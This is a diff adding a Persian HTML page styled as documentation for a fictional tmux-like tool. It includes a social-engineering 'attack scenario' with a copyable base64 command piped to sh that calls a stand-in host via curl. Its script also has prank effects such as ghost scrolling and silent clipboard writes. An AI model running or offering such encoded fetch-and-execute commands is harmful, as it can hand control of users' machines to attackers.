@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مستندات عملیاتی — SPYthere☬SHΞN™</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&family=VT323&display=swap" rel="stylesheet" />
+
+  <style>
+    :root {
+      --bg-color: #000000;
+      --scanline-color: rgba(0, 255, 0, 0.07);
+      --glow-color: rgba(57, 255, 20, 0.4);
+      --primary-green: #39FF14;
+      --dark-green: #003B00;
+      --text-color: #E6E6E6;
+      --selection-bg: rgba(58, 109, 184, 0.7);
+      --font-terminal: 'VT323', monospace;
+      --font-persian: 'Vazirmatn', sans-serif;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: var(--font-persian);
+      line-height: 1.8;
+      overflow-x: hidden;
+      background-image: linear-gradient(to bottom, var(--scanline-color) 50%, transparent 50%);
+      background-size: 100% 4px;
+      animation: flicker 0.15s infinite;
+    }
+    
+    @keyframes flicker { 0% { opacity: 0.95; } 50% { opacity: 1; } 100% { opacity: 0.95; } }
+
+    .container { max-width: 800px; margin: 0 auto; padding: 2rem 1rem; }
+
+    h1, h2, h3 {
+      font-family: var(--font-terminal);
+      color: var(--primary-green);
+      text-shadow: 0 0 5px var(--glow-color);
+      margin: 2em 0 1em 0;
+      border-bottom: 1px solid var(--dark-green);
+      padding-bottom: 8px;
+      letter-spacing: 1px;
+      text-align: center;
+    }
+    h1 { font-size: 3em; }
+    h2 { font-size: 2.2em; }
+    h3 { font-size: 1.5em; border: none; margin-top: 0; text-align: right; }
+
+    p, li { margin-bottom: 1em; }
+    a { color: var(--primary-green); text-decoration: none; }
+    a:hover { background-color: var(--primary-green); color: var(--bg-color); }
+    strong, b { color: var(--primary-green); font-weight: normal; }
+
+    .header, .footer {
+      font-family: var(--font-terminal);
+      font-size: 1.2em;
+      color: var(--primary-green);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px;
+      border: 1px solid var(--dark-green);
+      margin-bottom: 2em;
+    }
+    .footer { margin-top: 3em; padding: 15px; text-align: center; display: block; }
+
+    .panel { border: 1px solid var(--dark-green); padding: 1.5rem; margin: 1.5em 0; background-color: rgba(0, 10, 0, 0.2); }
+
+    .code-block-wrapper { border: 1px solid var(--dark-green); margin: 1.5em 0; background-color: #010a01; }
+    .code-block-header { display: flex; justify-content: space-between; align-items: center; background-color: var(--dark-green); padding: 8px 15px; font-family: var(--font-terminal); }
+    .copy-btn { background-color: var(--bg-color); color: var(--primary-green); border: 1px solid var(--primary-green); padding: 5px 10px; cursor: pointer; font-family: var(--font-persian); font-size: 0.8em; transition: all 0.2s ease; }
+    .copy-btn:hover, .copy-btn.copied { background-color: var(--primary-green); color: var(--bg-color); }
+    
+    pre { padding: 20px; margin: 0; white-space: pre-wrap; word-wrap: break-word; color: var(--text-color); font-family: var(--font-terminal); font-size: 1.2em; direction: ltr; text-align: left; text-shadow: 0 0 2px rgba(57, 255, 20, 0.5); }
+
+    .key { border: 1px solid var(--dark-green); padding: 2px 5px; color: var(--primary-green); }
+    var { color: #FFA500; font-style: normal; }
+    .flag { color: #87CEEB; }
+    blockquote { border-right: 3px solid var(--primary-green); padding: 15px 20px; margin: 1.5em 0; background-color: rgba(0, 10, 0, 0.2); }
+    
+    .scroll-content > * { transition: opacity 0.6s ease, transform 0.6s ease; opacity: 0; transform: translateY(20px); }
+    .scroll-content .active { opacity: 1; transform: translateY(0); }
+    
+    #source-code-overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: #fdfdfd; z-index: 99999; display: none;
+        font-family: 'Menlo', 'Consolas', monospace; font-size: 14px; line-height: 1.5; color: #333;
+        overflow: auto;
+    }
+    #source-code-overlay .editor-container { display: flex; min-height: 100%; }
+    #source-code-overlay .line-numbers { padding: 10px; text-align: right; color: #aaa; background: #f7f7f7; border-right: 1px solid #ddd; user-select: none; }
+    #source-code-overlay .code-content { padding: 10px; white-space: pre-wrap; word-wrap: break-word; flex-grow: 1; }
+
+    .token-tag { color: #d73a49; } .token-attr-name { color: #6f42c1; } .token-attr-value { color: #032f62; }
+
+    .text-glitch-active { transform: translateX(1px); text-shadow: -1px 0px 0px var(--bg-color); opacity: 0.95; }
+    .auto-selected { background-color: var(--selection-bg); }
+
+    #lcd-smudge {
+        position: fixed; width: 120px; height: 120px;
+        background: rgba(0, 0, 0, 0.025);
+        backdrop-filter: blur(0.4px); -webkit-backdrop-filter: blur(0.4px);
+        clip-path: polygon(40% 0, 60% 5%, 100% 30%, 95% 70%, 70% 100%, 30% 95%, 0 70%, 5% 30%);
+        pointer-events: none; z-index: 99998; display: none;
+    }
+
+    .nav-container { text-align: center; }
+    .dropdown { position: relative; display: inline-block; }
+    .dropdown-button { background-color: var(--primary-green); color: var(--bg-color); padding: 10px 20px; font-size: 1.2em; border: none; cursor: pointer; font-family: var(--font-terminal); }
+    .dropdown-content { display: none; position: absolute; right: 0; background-color: var(--bg-color); min-width: 220px; z-index: 100; border: 1px solid var(--primary-green); padding: 0; list-style: none; margin-top: 2px; }
+    .dropdown-content a { color: var(--primary-green); padding: 12px 16px; display: block; text-align: right; font-family: var(--font-terminal); }
+    .dropdown:hover .dropdown-content { display: block; }
+
+    @media (max-width: 600px) {
+      h1 { font-size: 2.2em; } h2 { font-size: 1.8em; } pre { font-size: 1em; }
+      .header { flex-direction: column; gap: 10px; }
+      #source-code-overlay { font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="lcd-smudge"></div>
+  <div id="source-code-overlay"></div>
+
+  <div class="container">
+    <div class="scroll-content">
+      <header class="header">
+        <span> SPYthere☬SHΞN™</span>
+        <span>!? Are you https</span>
+        <span> v13.0</span>
+      </header>
+
+      <nav class="nav-container panel">
+        <div class="dropdown">
+          <button class="dropdown-button"> فهرست [▼] </button>
+          <ul class="dropdown-content">
+            <li><a href="#synopsis">_خلاصه (SYNOPSIS)</a></li>
+            <li><a href="#description">_توضیحات (DESCRIPTION)</a></li>
+            <li><a href="#attack-scenario">_سناریوی_حمله</a></li>
+            <li><a href="#key-bindings">_کلیدهای_میانبر</a></li>
+            <li><a href="#commands">_دستورات</a></li>
+            <li><a href="#examples">_مثال‌ها</a></li>
+          </ul>
+        </div>
+      </nav>
+
+      <section id="synopsis">
+        <h1>خلاصه (SYNOPSIS)</h1>
+        <div class="code-block-wrapper">
+          <div class="code-block-header"><span>[BASH]</span><button class="copy-btn">کپی</button></div>
+          <pre><b>SPYthere☬SHΞN™</b> [<span class="flag">-2CDdJlNuv</span>] [<span class="flag">-c</span> <var>shell-command</var>] [<span class="flag">-f</span> <var>file</var>] [<span class="flag">-L</span> <var>socket-name</var>] [<span class="flag">-S</span> <var>socket-path</var>] [<var>command</var> [<var>args</var>]]</pre>
+        </div>
+      </section>
+
+      <section id="description">
+        <h1>توضیحات (DESCRIPTION)</h1>
+        <p><b>SPYthere☬SHΞN™</b> یک ابزار مالتی‌پلکسر ترمینال است که به شما اجازه می‌دهد تا چندین ترمینال مجزا را از یک صفحه نمایش واحد ایجاد، مدیریت و کنترل کنید. این ابزار قابلیت جدا شدن (detach) از یک نشست را فراهم می‌کند، در حالی که تمام فرآیندهای آن در پس‌زمینه به کار خود ادامه می‌دهają و شما می‌توانید در زمان دیگری مجدداً به آن متصل شوید.</p>
+        <p>با اجرای <b>SPYthere☬SHΞN™</b>، یک نشست جدید با یک پنجره ایجاد می‌شود. نوار وضعیت در پایین صفحه، اطلاعات کلیدی نشست فعلی را نمایش می‌دهد و به عنوان رابطی برای ورود دستورات تعاملی عمل می‌کند.</p>
+      </section>
+
+      <section id="attack-scenario">
+        <h1>سناریوی حمله: مهندسی اجتماعی</h1>
+        <p>این بخش یک سناریوی حمله رایج را تشریح می‌کند که در آن، مهاجم با استفاده از تکنیک‌های مهندسی اجتماعی، قربانی را فریب می‌دهد تا دسترسی به نشست خود را به اشتراک بگذارد.</p>
+        <div class="panel">
+          <h3>مرحله ۱: پیام هشدار جعلی</h3>
+          <p>سیستم یک پیام هشدار جعلی نمایش می‌دهد:</p>
+          <div class="code-block-wrapper">
+            <div class="code-block-header"><span>[System_Alert]</span><button class="copy-btn">کپی</button></div>
+            <pre>[WARNING] اتصال شما از سمت سرور ایمن شناخته نشده است.
+برای تأیید هویت، دستور زیر را اجرا کنید:
+<var>verify-connection</var></pre>
+          </div>
+        </div>
+        <div class="panel">
+          <h3>مرحله ۲: اجرای اسکریپت جعلی</h3>
+          <p>قربانی دستور را وارد می‌کند و یک اسکریپت پایتون جعلی اجرا می‌شود:</p>
+          <div class="code-block-wrapper">
+            <div class="code-block-header"><span>[Python_Output]</span><button class="copy-btn">کپی</button></div>
+            <pre>import ssl, socket
+hostname = 'corp.internal.net'
+context = ssl.create_default_context()
+print(f"[*] Attempting to establish secure handshake with {hostname}...")
+with socket.create_connection((hostname, 443)) as sock:
+    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
+        print(f"[+] SSL/TLS Version: {ssock.version()}")
+        print(f"[!] Mismatch detected. Manual verification needed.")
+        print("Verification URL: https://verify.secure-link.io/result/a7b3c9d1")</pre>
+          </div>
+        </div>
+        <div class="panel">
+          <h3>مرحله ۳: دریافت مجوز از خود قربانی</h3>
+          <blockquote><p><b>Are you https://?</b></p><p>اگر قفل کنار آدرس وجود دارد، کد زیر را در ترمینال اجرا کنید تا نشست شما ایمن شناخته شود.</p></blockquote>
+          <div class="code-block-wrapper">
+            <div class="code-block-header"><span>[Verification_Code]</span><button class="copy-btn">کپی</button></div>
+            <pre>echo 'ZXhwb3J0IFRFUk1fU0VTU0lPTj0kKGN1cmwgLXMgYXBpLnNlY3VyZS1saW5rLmlvL25ldy1zZXNzaW9uKQo=' | base64 --decode | sh</pre>
+          </div>
+        </div>
+        <div class="panel">
+          <h3>مرحله ۴: سرقت نشست</h3>
+          <p>این دستور در واقع معادل است با:</p>
+          <pre>export TERM_SESSION=$(curl -s api.secure-link.io/new-session)</pre>
+          <p>در این لحظه، مهاجم کنترل کامل نشست قربانی را به دست می‌آورد.</p>
+        </div>
+      </section>
+
+      <section id="key-bindings">
+        <h1>کلیدهای میانبر (KEY BINDINGS)</h1>
+        <p>پیشوند پیش‌فرض: <span class="key">C-b</span></p>
+      </section>
+
+      <section id="commands">
+        <h1>دستورات (COMMANDS)</h1>
+        <div class="code-block-wrapper">
+          <div class="code-block-header"><span>[BASH]</span><button class="copy-btn">کپی</button></div>
+          <pre><b>attach-session</b> -t <var>target-session</var>
+<b>new-session</b> -s <var>session-name</var>
+<b>list-sessions</b>
+<b>kill-session</b> -t <var>target-session</var></pre>
+        </div>
+      </section>
+
+      <section id="examples">
+        <h1>مثال‌ها (EXAMPLES)</h1>
+        <div class="code-block-wrapper">
+          <div class="code-block-header"><span>[BASH]</span><button class="copy-btn">کپی</button></div>
+          <pre>$ SPYthere☬SHΞN™ new -s mysession
+$ SPYthere☬SHΞN™ attach -t mysession
+$ SPYthere☬SHΞN™ ls</pre>
+        </div>
+      </section>
+
+      <footer class="footer"><span>Exclusive ☬SHΞN™ made</span></footer>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) entry.target.classList.add('active');
+        });
+      }, { threshold: 0.1 });
+      document.querySelectorAll('.scroll-content > *').forEach(el => observer.observe(el));
+
+      document.querySelectorAll('.copy-btn').forEach(button => {
+        button.addEventListener('click', () => {
+          const pre = button.closest('.code-block-wrapper').querySelector('pre');
+          if (!pre) return;
+          navigator.clipboard.writeText(pre.innerText).then(() => {
+            button.textContent = 'کپی شد!';
+            button.classList.add('copied');
+          }).finally(() => {
+            setTimeout(() => {
+              button.textContent = 'کپی';
+              button.classList.remove('copied');
+            }, 2000);
+          });
+        });
+      });
+
+      const glitchEngine = {
+        isGlitching: false,
+        sourceCodeOverlay: document.getElementById('source-code-overlay'),
+        sourceCodeChunks: [],
+        touchCount: 0,
+        lastScrollY: window.scrollY,
+        dragLine: null,
+
+        init() {
+          this.prepareSourceCode();
+          this.scheduleNextGlitch(8000);
+          setTimeout(() => this.triggerLcdStain(), 25000 + Math.random() * 20000);
+          window.addEventListener('scroll', () => this.handleScroll(), { passive: true });
+          document.body.addEventListener('touchstart', () => this.handleTouch());
+        },
+
+        syntaxHighlight(html) {
+            return html.replace(/&/g, '&amp;').replace(/</g, '&lt;')
+                .replace(/(".*?")/g, '<span class="token-attr-value">$1</span>')
+                .replace(/(&lt;\/?)([\w-]+)/g, '$1<span class="token-tag">$2</span>')
+                .replace(/([\w-]+)=/g, '<span class="token-attr-name">$1</span>=');
+        },
+
+        prepareSourceCode() {
+          const fullSource = document.documentElement.outerHTML;
+          const lines = fullSource.split('\n');
+          const chunkSize = Math.ceil(lines.length / 3);
+          for (let i = 0; i < 3; i++) {
+            this.sourceCodeChunks.push(lines.slice(i * chunkSize, (i + 1) * chunkSize));
+          }
+        },
+        
+        runSequence(sequence) {
+            if (this.isGlitching) return;
+            this.isGlitching = true;
+            let promise = Promise.resolve();
+            sequence.forEach(action => {
+                promise = promise.then(() => new Promise(resolve => {
+                    setTimeout(() => {
+                        action.func.call(this);
+                        resolve();
+                    }, action.delay);
+                }));
+            });
+            promise.then(() => { 
+                this.isGlitching = false;
+                this.scheduleNextGlitch();
+            });
+        },
+
+        scheduleNextGlitch(initialDelay = 30000 + Math.random() * 40000) {
+            setTimeout(() => {
+                const glitches = [
+                    { func: this.triggerGhostScroll, delay: 0 },
+                    { func: this.flashSourceCode, delay: 0 },
+                    { func: this.triggerSmallGlitch, delay: 0 }
+                ];
+                this.runSequence([glitches[Math.floor(Math.random() * glitches.length)]]);
+            }, initialDelay);
+        },
+
+        flashSourceCode() {
+          this.sourceCodeOverlay.style.display = 'block';
+          let page = 0;
+          const interval = setInterval(() => {
+            if (page < 3) {
+              const chunk = this.sourceCodeChunks[page];
+              let lineNumbersHTML = '';
+              for(let i = 1; i <= chunk.length; i++) { lineNumbersHTML += `${i}<br>`; }
+              const codeHTML = this.syntaxHighlight(chunk.join('\n'));
+              this.sourceCodeOverlay.innerHTML = `<div class="editor-container"><div class="line-numbers">${lineNumbersHTML}</div><pre class="code-content">${codeHTML}</pre></div>`;
+              page++;
+            } else {
+              clearInterval(interval);
+              this.sourceCodeOverlay.style.display = 'none';
+              this.sourceCodeOverlay.innerHTML = '';
+            }
+          }, 250);
+        },
+
+        triggerAutoCopy() {
+            const target = Array.from(document.querySelectorAll('p, pre')).filter(el => {
+                const rect = el.getBoundingClientRect();
+                return rect.top >= 0 && rect.bottom <= window.innerHeight;
+            }).pop();
+            if (!target) return;
+
+            const originalText = target.innerText;
+            const textToCopy = originalText.substring(0, Math.floor(originalText.length * 0.5));
+            const selectionSpan = document.createElement('span');
+            selectionSpan.className = 'auto-selected';
+            selectionSpan.textContent = textToCopy;
+            target.innerHTML = '';
+            target.appendChild(selectionSpan);
+            target.append(originalText.substring(textToCopy.length));
+            navigator.clipboard.writeText(textToCopy).catch(err => {});
+            setTimeout(() => {
+                target.innerHTML = '';
+                target.innerText = originalText;
+            }, 700);
+        },
+        
+        triggerLcdStain() {
+            const smudge = document.getElementById('lcd-smudge');
+            smudge.style.top = `${15 + Math.random() * 50}%`;
+            smudge.style.left = `${15 + Math.random() * 50}%`;
+            smudge.style.transform = `rotate(${Math.random() * 360}deg) scale(${0.8 + Math.random() * 0.4})`;
+            smudge.style.display = 'block';
+        },
+
+        triggerPixelDrag() {
+            if (this.dragLine) return;
+            this.dragLine = document.createElement('div');
+            this.dragLine.style.cssText = `position:fixed; top:0; height:100vh; width:1px; background:var(--bg-color); z-index:10000; left:${10 + Math.random() * 80}vw;`;
+            document.body.appendChild(this.dragLine);
+        },
+        
+        clearPixelDrag() {
+            if (this.dragLine) {
+                this.dragLine.remove();
+                this.dragLine = null;
+            }
+        },
+
+        triggerGhostScroll() {
+            const scrolls = [
+                { y: 150, delay: 100 },
+                { y: -250, delay: 250 },
+                { y: 100, delay: 200 },
+                { y: -50, delay: 150 }
+            ];
+            let promise = Promise.resolve();
+            scrolls.forEach(scroll => {
+                promise = promise.then(() => new Promise(resolve => {
+                    setTimeout(() => {
+                        window.scrollBy({ top: scroll.y, behavior: 'smooth' });
+                        resolve();
+                    }, scroll.delay);
+                }));
+            });
+        },
+
+        triggerSmallGlitch() {
+            const target = Array.from(document.querySelectorAll('.panel p, .code-block-wrapper pre')).filter(el => {
+                const rect = el.getBoundingClientRect();
+                return rect.top >= 0 && rect.bottom <= window.innerHeight;
+            }).pop();
+            if (!target) return;
+            target.classList.add('text-glitch-active');
+            setTimeout(() => target.classList.remove('text-glitch-active'), 100);
+        },
+
+        handleScroll() {
+            if (this.isGlitching) return;
+            const scrollDirection = window.scrollY > this.lastScrollY ? 'down' : 'up';
+            const scrollSpeed = Math.abs(window.scrollY - this.lastScrollY);
+
+            if (scrollDirection === 'down' && scrollSpeed > 250) {
+                this.triggerPixelDrag();
+            } else if (scrollDirection === 'up') {
+                this.clearPixelDrag();
+            }
+            
+            this.lastScrollY = window.scrollY;
+        },
+
+        handleTouch() {
+            if (this.isGlitching || this.touchCount > 4) return;
+            this.touchCount++;
+            if (this.touchCount === 5) {
+                this.runSequence([{ func: this.triggerAutoCopy, delay: 100 }]);
+            }
+        },
+
+        initialPrank: [
+          { func: function() { this.flashSourceCode() }, delay: 500 }
+        ]
+      };
+
+      glitchEngine.init();
+    });
+  </script>
+</body>
+</html>
